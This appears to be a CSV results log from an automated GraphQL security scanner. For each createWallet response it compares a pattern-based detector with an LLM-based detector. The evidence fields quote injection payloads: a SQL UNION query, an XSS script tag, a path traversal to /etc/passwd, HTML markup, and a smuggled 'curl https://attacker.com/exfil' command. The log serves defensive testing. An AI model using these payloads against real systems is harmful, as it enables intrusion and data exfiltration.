timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-07T02:23:17.989046,createWallet_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The payload 'UNION SELECT * FROM wallets--' in the name field demonstrates a classic SQL injection attempt. The UNION operator suggests an attempt to combine results from the wallets table, and the double hyphen (--) indicates an attempt to comment out subsequent SQL code. While no error is shown, the successful execution (status 200) with this payload suggests insufficient input sanitization in backend database operations."", ""evidence"": ""name: 'Test' UNION SELECT * FROM wallets--'"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.85, ""evidence"": ""name: 'Test' UNION SELECT * FROM wallets--'"", ""explanation"": ""The payload 'UNION SELECT * FROM wallets--' in the name field demonstrates a classic SQL injection attempt. The UNION operator suggests an attempt to combine results from the wallets table, and the double hyphen (--) indicates an attempt to comment out subsequent SQL code. While no error is shown, the successful execution (status 200) with this payload suggests insufficient input sanitization in backend database operations.""}}]"
2025-10-07T02:23:24.354131,createWallet_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response includes unsanitized user-controlled input containing a JavaScript payload (<script>alert(document.domain)</script>) in the 'name' field. This indicates the application is reflecting raw HTML/script content without proper output encoding or validation. If this value is rendered in a browser context without sanitization, it would execute arbitrary JavaScript, constituting a stored XSS vulnerability. The payload's presence in a GraphQL mutation response suggests insufficient input validation on the server side."", ""evidence"": ""The 'name' field contains '<script>alert(document.domain)</script>' in the response body"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""The 'name' field contains '<script>alert(document.domain)</script>' in the response body"", ""explanation"": ""The response includes unsanitized user-controlled input containing a JavaScript payload (<script>alert(document.domain)</script>) in the 'name' field. This indicates the application is reflecting raw HTML/script content without proper output encoding or validation. If this value is rendered in a browser context without sanitization, it would execute arbitrary JavaScript, constituting a stored XSS vulnerability. The payload's presence in a GraphQL mutation response suggests insufficient input validation on the server side.""}}]"
2025-10-07T02:23:29.056135,createWallet_response_4,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T02:23:34.857713,createWallet_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The payload contains a semicolon (command separator) followed by a curl command to an external domain, indicating potential command chaining. In GraphQL contexts, if this input is passed unsanitized to system()/exec() calls, it could enable arbitrary command execution. However, confirmation would require verifying server-side input handling."", ""evidence"": ""name: 'test; curl https://attacker.com/exfil'"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.85, ""evidence"": ""name: 'test; curl https://attacker.com/exfil'"", ""explanation"": ""The payload contains a semicolon (command separator) followed by a curl command to an external domain, indicating potential command chaining. In GraphQL contexts, if this input is passed unsanitized to system()/exec() calls, it could enable arbitrary command execution. However, confirmation would require verifying server-side input handling.""}}]"
2025-10-07T02:23:39.614366,createWallet_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a directory traversal payload (../../../../etc/passwd) in the wallet name field. This indicates potential path injection vulnerability where an attacker might be manipulating file system paths to access sensitive system files like /etc/passwd. The server accepted and returned the malicious payload without apparent sanitization, suggesting improper path handling in the GraphQL resolver."", ""evidence"": ""name: \""../../../../etc/passwd\"" in createWallet mutation response"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""name: \""../../../../etc/passwd\"" in createWallet mutation response"", ""explanation"": ""The response contains a directory traversal payload (../../../../etc/passwd) in the wallet name field. This indicates potential path injection vulnerability where an attacker might be manipulating file system paths to access sensitive system files like /etc/passwd. The server accepted and returned the malicious payload without apparent sanitization, suggesting improper path handling in the GraphQL resolver.""}}]"
2025-10-07T02:24:08.442057,createWallet_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,0,1,0,1.0,both_potential,Injection Attacks,,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The API returns unsanitized user-controlled HTML content in the 'name' field. The presence of an HTML header tag (<h1>) and unclosed HTML comment indicates the server isn't properly escaping/validating user input. If this value is rendered in a web interface without output encoding, it could allow HTML element injection and partial page manipulation (though full XSS requires script execution). While the payload is passive in this example, it demonstrates markup manipulation capability."", ""evidence"": ""Wallet name contains unescaped HTML payload: \""<h1>Admin Wallet</h1><!--\"""", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.8, ""evidence"": ""Wallet name contains unescaped HTML payload: \""<h1>Admin Wallet</h1><!--\"""", ""explanation"": ""The API returns unsanitized user-controlled HTML content in the 'name' field. The presence of an HTML header tag (<h1>) and unclosed HTML comment indicates the server isn't properly escaping/validating user input. If this value is rendered in a web interface without output encoding, it could allow HTML element injection and partial page manipulation (though full XSS requires script execution). While the payload is passive in this example, it demonstrates markup manipulation capability.""}}]"
2025-10-07T02:24:20.586454,createWallet_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T02:24:30.448285,createWallet_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T02:24:46.717177,createWallet_response_10,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,[],"[{""detection_name"": ""LLM: Information Disclosure"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The server's error response discloses internal schema details by suggesting valid field names (\""getWallet\"" or \""getWallets\""), which aids attackers in enumerating API structure. Additionally, the stacktrace reveals internal file paths and server implementation (Apollo Server), indicating potential exposure of sensitive debugging information. While this does not directly confirm introspection is enabled, it demonstrates information leakage that could facilitate further attacks."", ""evidence"": ""Field suggestions (\""getWallet\"" or \""getWallets\"") and stacktrace exposure in error response"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Information Disclosure"", ""severity"": ""MEDIUM"", ""confidence"": 0.8, ""evidence"": ""Field suggestions (\""getWallet\"" or \""getWallets\"") and stacktrace exposure in error response"", ""explanation"": ""The server's error response discloses internal schema details by suggesting valid field names (\""getWallet\"" or \""getWallets\""), which aids attackers in enumerating API structure. Additionally, the stacktrace reveals internal file paths and server implementation (Apollo Server), indicating potential exposure of sensitive debugging information. While this does not directly confirm introspection is enabled, it demonstrates information leakage that could facilitate further attacks.""}}]"
2025-10-07T02:24:51.991768,createWallet_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Injection Attacks,1,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: Information Disclosure"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response explicitly discloses valid schema fields via typo correction suggestions ('Did you mean...'). While this is normal GraphQL validation behavior, it exposes schema structure to unauthenticated clients (via HTTP 400 errors), potentially aiding attackers in reconnaissance and query crafting. This meets the criteria for field_suggestions vulnerability under Information Disclosure, though the risk is moderated by the fact that it's a common default behavior in GraphQL implementations."", ""evidence"": ""Multiple 'Did you mean...' suggestions in error responses (e.g., \""balance\"", \""currency\"", \""user\"")"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Information Disclosure"", ""severity"": ""MEDIUM"", ""confidence"": 0.95, ""evidence"": ""Multiple 'Did you mean...' suggestions in error responses (e.g., \""balance\"", \""currency\"", \""user\"")"", ""explanation"": ""The GraphQL response explicitly discloses valid schema fields via typo correction suggestions ('Did you mean...'). While this is normal GraphQL validation behavior, it exposes schema structure to unauthenticated clients (via HTTP 400 errors), potentially aiding attackers in reconnaissance and query crafting. This meets the criteria for field_suggestions vulnerability under Information Disclosure, though the risk is moderated by the fact that it's a common default behavior in GraphQL implementations.""}}]"
